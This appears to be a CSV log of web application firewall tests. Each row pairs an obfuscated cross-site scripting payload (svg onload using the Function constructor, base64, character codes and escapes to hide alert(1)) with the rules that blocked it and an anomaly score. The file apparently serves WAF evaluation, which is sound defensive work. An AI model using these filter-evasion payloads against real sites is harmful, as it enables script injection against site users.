2343,"<svg onload=""Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603553425.767291
2345,"<svg onload=""with(this)Function('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760355370.473114
2347,"<svg onload=""top['Function']('return al'+'ert(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,36v217,54t:urlDecode,t:replaceComments,t:compressWhitespace || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,54t:urlDecodeUni,t:compressWhitespace || ",25,177603554066.834530
2348,"<svg onload=""window['Function']['constructor']('return al'+'ert(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,51v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,72t:urlDecodeUni,t:compressWhitespace || ",25,177603554184.174048
2350,"<svg onload=""(function(){return this})()['Function']('return al'+'ert(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,63v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,78 || o14,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603554318.336937
2354,"<svg onload=""Function(String.fromCharCode(114,101,116,117,114,110,32,97,108)+'ert(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o22,19v217,90 || o22,19v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603554848.769646
2356,"<svg onload=""globalThis['Function']('retu'+'rn\u0020al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,44v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603555062.295980
2359,"<svg onload=""Function(unescape('%72%65%74%75%72%6E%20%61%6C')+'ert(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603555460.190696
2360,"<svg onload=""Function('re'+'turn\x20al'+'ert(1)')()"">",0,1,block,6,"941100,941120,941160,942100,942100,949110","v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,53 || v217,53t:urlDecodeUni || ",25,177603555529.125514
2362,"<svg onload=""Function['prototype']['constructor']('return al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,52v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603555742.790737
2363,"<svg onload=""Function(String['fromCharCode'](114,101,116,117,114,110,32,97,108,101,114,116,40,49,41))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,82v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603555939.678063
2365,"<svg onload=""Function.apply(null,['return al'+'ert(1)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603556170.627360
2370,"<svg onload=""(()=>{return Function('retu'+'rn al'+'ert(1)')()})()"">",0,1,block,5,"933210,941100,941120,941160,949110","o34,31v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603556725.172894
2371,"<svg onload=""Function[String.fromCharCode(99,97,108,108)](null,'return\x20alert(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603556831.132077
2375,"<svg onload=""Function['constru'+'ctor']('return al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,42v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603557380.305370
2377,"<svg onload=""[]['filter']['constructor']('retu'+'rn ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,54v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603557667.583498
2378,"<svg onload=""Function('re\u0074urn\u0020al\u0065r\u0074(1)')()"">",0,1,block,5,"941100,941120,941160,942100,949110","v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,64 || ",20,17760355774.504265
2381,"<svg onload=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603558138.139358
2383,"<svg onload=""(function(){return Function('retu'+'rn\x20aler'+'t(1)')()})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o63,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,76 || o14,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603558367.955795
2388,"<svg onload=""self['Function'](String['fromCharCode'](97,108,101,114,116,40,49,41))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,67v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,86t:urlDecodeUni,t:compressWhitespace || ",25,177603558976.357484
2394,"<svg onload=""with(window)Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603559747.186511
2399,"<svg onload=""name=atob('YWxlcnQoMSk=');Function(name)()"">",0,1,block,4,"941100,941120,941160,949110","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603560379.363706
2403,"<svg onload=""Function['constructor'](''+atob('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,42v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603560725.025796
2406,"<svg onload=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603561173.305820
2407,"<svg onload=""new Function(window['atob']('YWxlcnQoMSk='))()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o25,34v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,14v217,61t:urlDecodeUni,t:compressWhitespace || ",30,177603561382.582089
2409,"<svg onload=""new	Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561592.323751
2410,"<svg/onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561642.512991
2411,"<svg	onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561843.410698
2412,"<svg onload=""new Function([]+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561955.052911
2413,"<svg onload=""new Function(atob`YWxlcnQoMSk=`)()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,49 || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562062.506849
2414,"<svg onload=""new Function(atob.call(null,'YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562122.908889
2415,"<svg onload=""new Function(atob.apply(null,['YWxlcnQoMSk=']))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562339.447430
2416,"<svg onload=""new Function(self.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,56 || v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562481.238320
2417,"<svg onload=""new Function(top.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562577.779195
2418,"<svg onload=""new Function(parent.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,58 || v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562623.252005
2420,"<svg onload=""Function('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,5,"941100,941120,941160,942100,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,62 || ",20,177603562899.972875
2425,"<svg onload=""new Function('\141\154\145\162\164(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,56 || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603563580.639737
2426,"<svg onload=""new Function('\u{61}\u{6c}\u{65}\u{72}\u{74}(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603563666.660855
2428,"<svg onload=""new top['Function']('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o20,51v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,15v217,73t:urlDecodeUni,t:compressWhitespace || ",25,177603563952.044433
2429,"<svg onload=""new(Function)('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603564025.011408
2434,"<svg onload=""new Function(atob('YWxlcnQoMSk'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,50 || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603564642.930152
2436,"<svg onload=""new Function('\x61'+'l'+'e'+'r'+'t(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,56 || o13,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603564917.057178
2439,"<svg onload=""new Function(String.fromCodePoint(97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603565233.393220
2440,"<svg onload=""new Function('al'+`\u0065`+'rt(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,52 || o13,13v217,52t:urlDecodeUni || v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603565426.331834
2443,"<svg onload=""new Function(['al','ert','(1)'].join(''))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,58 || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603565799.545424
2444,"<svg onload=""new Function('al'+'e'+'r'+'t'+'(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,53 || o13,13v217,53t:urlDecodeUni || v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603565847.542534
2445,"<svg onload=""new Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o25,55v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566041.574042
2447,"<svg onload=""new Function(`al${'e'}rt(1)`)()"">",0,1,block,6,"932130,934100,941100,941120,941160,949110","o28,4v216,46t:urlDecodeUni,t:cmdLine || o13,13v216,46 || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566242.054365
2448,"<svg onload=""new Function('al'.concat(String.fromCharCode(101),'rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566449.525673
2449,"<svg onload=""new Function(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,121 || o13,13v217,121t:urlDecodeUni || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566593.716127
